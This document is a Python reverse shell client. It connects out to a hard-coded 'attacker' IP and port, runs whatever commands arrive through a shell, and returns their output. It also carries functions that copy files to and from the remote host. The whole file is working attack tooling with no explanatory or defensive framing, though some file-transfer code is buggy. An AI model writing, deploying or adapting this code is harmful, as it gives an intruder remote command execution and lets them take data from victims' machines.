import socket
import subprocess
import os

attacker_ip = '192.168.0.108'
attacker_port = 6996

def download(file_name):
    file_to_download = open(file_name, 'rb')
    data_to_send = file_to_download.read()
    data_to_send = data_to_send.encode()
    sock.send(data_to_send)

def upload(file_name):
    file_upload = open(file_name, 'wb')
    data_recv = sock.recv(2048)
    data_recv = data_recv.decode()
    file_upload.write(data_recv)

def get_command():
    while True:
        command = sock.recv(2048)
        command = command.decode()
        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
                msg = "Changed directory to " + command[3:]
                sock.send(msg.encode())
                continue
            except:
                continue
        elif command[:5] == 'mkdir' and len(command) > 1:
            try:
                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                msg = "Make folder successfully !!"
                sock.send(msg.encode())
                continue
            except:
                continue
        elif command[:5] == 'rmdir' and len(command) > 1:
            try:
                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                msg = "Remove Directory Successfully !!"
                sock.send(msg.encode())
                continue
            except:
                continue
        elif command[:4] == 'echo' and len(command) > 1:
            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            msg = "echo successfully !!"
            sock.send(msg.encode())

        elif command[:8] == 'download' and len(command) > 1:
            try:
                download(command[9:])
                msg = "Download Successfully"
                sock.send(msg.encode())
            except:
                msg_failed = "failed to download " + command[9:]
                sock.send(msg_failed.encode())

        elif command[:6] == 'upload' and len(command) > 1:
            try:
                upload()
                msg = "Upload Successfully !1"
                sock.send(msg.encode())
            except:
                msg_failed = "Failed to upload !!"
                sock.send(msg_failed.encode())
                continue
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)
            continue

def connect_to_attacker():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))

if __name__ == "__main__":
    connect_to_attacker()
    get_command()
    sock.close()